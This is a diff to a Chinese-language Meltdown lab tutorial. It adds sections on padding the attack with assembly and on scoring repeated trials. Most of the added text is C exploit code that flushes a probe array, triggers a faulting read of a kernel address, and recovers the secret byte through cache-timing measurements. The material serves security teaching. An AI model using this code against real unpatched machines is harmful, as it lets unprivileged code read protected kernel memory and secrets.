@@ -210,4 +210,88 @@ int main()
 ***
 #### 汇编代码引发 Meltdown
 
-即使内核数据已经在 CPU 缓存当中，
+即使内核数据已经在 CPU 缓存当中，我们仍然可能没法实现 Meltdown 攻击。
+
+根据[相关研究](https://github.com/paboldin/meltdown-exploit/issues/33)我们可以在引发异常之前添加一些汇编代码（这些汇编代码没有任何作用，单纯就只是执行），这样能提升我们获得秘密值的概率（诡异至极），我们将 `meltdown()` 函数替换成如下 `meltdown_asm()` 函数：
+
+```c title="meltdown_asm.c"
+void meltdown_asm(unsigned long kernel_data_addr)
+{
+	char kernel_data = 0;
+	// 给eax 寄存器提供一些事情做
+	asm volatile(
+		".rept 400;"
+		"add $0x141, %%eax;"
+		".endr;"
+		:
+		:
+		: "eax"
+	);
+	
+	// 以下语句将引发一个异常
+	kernel_data = *(char*)kernel_data_addr;
+	array[kernel_data * 4096 + DELTA] += 1;
+}
+```
+***
+#### 统计学方法
+
+为了提高准确性，我们可以使用统计技术。基本思想是创建一个大小为 256 的 `score` 数组，每个可能的秘密值对应一个元素。然后我们多次运行攻击程序。每次，如果我们的攻击程序认为 k 是秘密值（这可能是错误的），我们就将 1 加到 `scores[k]` 中。在多次运行后，我们可以使用具有最高分数的 k 作为最终估计的秘密值。这种方法会比单次运行得到的结果更加可靠。修改后的代码如下所示：
+
+```c title="MeltdownAttack.c"
+static int scores[256];
+void reloadSideChannelImproved()
+{
+	int i;
+	volatile uint8_t *addr;
+	register uint64_t time1, time2;
+	int junk = 0;
+	for (i = 0; i < 256; i++) {
+		addr = &array[i * 4096 + DELTA];
+		time1 = __rdtscp(&junk);
+		junk = *addr;
+		time2 = __rdtscp(&junk) - time1;
+		if (time2 <= CACHE_HIT_THRESHOLD)
+			scores[i]++; /* 如果是缓存命中，则该值加 1 */
+	}
+}
+// 信号处理器
+static sigjmp_buf jbuf;
+static void catch_segv() { siglongjmp(jbuf, 1); }
+int main()
+{
+	int i, j, ret = 0;
+	// 设置信号处理程序
+	signal(SIGSEGV, catch_segv);
+	int fd = open("/proc/secret_data", O_RDONLY);
+	if (fd < 0) {
+		perror("open");
+		return -1;
+	}
+	memset(scores, 0, sizeof(scores));
+	flushSideChannel();
+	
+	// 在同一地址上重试 1000 次
+	for (i = 0; i < 1000; i++) {
+		ret = pread(fd, NULL, 0, 0);
+		if (ret < 0) {
+			perror("pread");
+			break;
+		}
+		// 将待探测数组缓的缓存清除
+		for (j = 0; j < 256; j++)
+			_mm_clflush(&array[j * 4096 + DELTA]);
+			if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0xfb61b000); }
+			reloadSideChannelImproved();
+	}
+	// 找出得分最高的索引
+	int max = 0;
+	for (i = 0; i < 256; i++) {
+		if (scores[max] < scores[i]) max = i;
+	}
+	printf("The secret value is %d %c\n", max, max);
+	printf("The number of hits is %d\n", scores[max]);
+	return 0;
+}
+```
+
